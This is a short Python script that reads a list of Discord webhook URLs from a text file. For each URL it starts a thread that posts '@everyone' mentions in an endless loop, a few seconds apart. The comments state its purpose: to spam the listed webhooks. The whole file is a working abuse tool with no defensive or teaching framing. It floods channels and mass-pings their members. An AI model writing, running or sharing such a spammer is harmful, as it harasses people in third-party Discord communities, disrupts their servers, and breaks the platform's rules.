#create a text file in the same directory as this file containing a list of webhook URLs
#you wish to spam, there should be one URL per line
def webhook_spam():
        url = []
        file = open("url.txt","r")
        a = file.read()
        file.close()
        b = a.split("\n")
        for c in b:
            url.append(c)
        def connect(URL,CONTENT):
            webhook = DiscordWebhook(url=URL, content=CONTENT)
            response = webhook.execute()

        def ping(URL):
            num = random.randint(1,5)
            time.sleep(num)
            content = "@everyone"
            allowed_mentions = {
                "parse": ["everyone"],
                "users": ["123", "124"]
            }

            webhook = DiscordWebhook(url=URL, content=content, allowed_mentions=allowed_mentions)
            
            while True:
                for x in range(13):
                    response = webhook.execute()
                    time.sleep(1)
                time.sleep(5)


        for connection in url:
            connect(connection,"connection established")
            Thread(target = ping,args=(connection,)).start()
            #ping(connection)
            print("success")
webhook_spam()
